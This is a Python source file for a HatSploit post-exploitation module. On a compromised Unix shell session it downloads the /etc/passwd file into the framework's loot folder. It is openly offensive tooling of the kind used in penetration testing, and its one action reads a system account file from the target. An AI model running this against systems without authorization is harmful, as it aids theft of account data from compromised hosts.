"""
This module requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.loot import Loot
from hatsploit.lib.module.basic import *
from hatsploit.lib.sessions import Sessions


class HatSploitModule(Module, Sessions):
    def __init__(self):
        super().__init__()

        self.details.update({
            'Category': "post",
            'Name': "Unix Obtain /etc/passwd",
            'Module': "post/unix/shell/getpasswd",
            'Authors': [
                "Ivan Nikolskiy (enty8080) - module developer",
            ],
            'Description': (
                "Get current session /etc/passwd file."
            ),
            'Platform': OS_UNIX,
            'Rank': MEDIUM_RANK,
        })

        self.session = SessionOption(None, "Session to run on.", True,
                                     platforms=[OS_UNIX],
                                     type='shell')
        self.path = Option(Loot().specific_loot('passwd'), "Path to save file.", True)

    def run(self):
        self.session_download(self.session.value, '/etc/passwd', self.path.value)
